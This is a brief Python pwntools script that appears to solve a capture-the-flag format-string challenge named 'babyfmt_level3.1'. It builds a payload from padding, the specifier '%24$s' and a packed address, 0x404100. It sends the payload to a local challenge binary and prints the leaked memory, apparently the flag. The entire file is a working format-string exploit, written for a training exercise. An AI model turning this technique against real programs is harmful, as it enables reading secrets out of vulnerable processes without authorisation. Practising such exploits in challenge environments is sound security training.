from pwn import *

context.arch = 'amd64'


p = process("/challenge/babyfmt_level3.1")
payload = b"A"*5 + b"%24$s" + b"AAA" + p64(0x404100)
print(payload)
p.send(payload)
print(p.recvall().decode())